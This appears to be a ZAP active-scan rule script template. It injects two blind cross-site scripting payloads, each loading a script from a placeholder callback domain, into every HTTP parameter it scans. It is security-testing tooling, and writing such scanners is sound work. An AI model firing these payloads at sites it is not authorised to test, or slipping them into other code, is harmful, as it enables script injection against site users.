// An example active scan rule script which uses a set of attack payloads and a set of regexes
// in order to find potential issues.
// Replace or extend the attacks and evidence regexes with you own values.

// Note that new active scripts will initially be disabled
// Right click the script in the Scripts tree and select "enable"  

// Replace or extend these with your own attacks
// put the attacks you most want to run higher, unless you disable the attack strength check
var attacks = [
	'<script src=//callbackdomain.com>',
	'"><script src=//callbackdomain.com>',
]

/**
 * Scans a "node", i.e. an individual entry in the Sites Tree.
 * The scanNode function will typically be called once for every page. 
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.
 */
function scanNode(as, msg) {
	// Do nothing here - this script just attacks parameters rather than nodes
}

/**
 * Scans a specific parameter in an HTTP message.
 * The scan function will typically be called for every parameter in every URL and Form for every page.
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.
 * @param {string} param - the name of the parameter being manipulated for this test/scan.
 * @param {string} value - the original parameter value.
 */
function scan(as, msg, param, value) {
	// Debugging can be done using print like this
	//print('scan called for url=' + msg.getRequestHeader().getURI().toString() + 
	//	' param=' + param + ' value=' + value);
	
	var max_attacks = attacks.length	// No limit for the "INSANE" level ;)
	
	if (as.getAttackStrength() == "LOW") {
		max_attacks = 6
	} else if (as.getAttackStrength() == "MEDIUM") {
		max_attacks = 12
	} else if (as.getAttackStrength() == "HIGH") {
		max_attacks = 24
	}

	for (var i in attacks) {
		// Dont exceed recommended number of attacks for strength
		// feel free to disable this locally ;)
		if (i > max_attacks) {
			return
		}
		// Copy requests before reusing them
		msg = msg.cloneRequest();

		// setParam (message, parameterName, newValue)
		as.setParam(msg, param, attacks[i]);
		
		// sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
		as.sendAndReceive(msg, false, false);

		// Check if the scan was stopped before performing lengthy tasks
		if (as.isStop()) {
			return
		}
	}
}
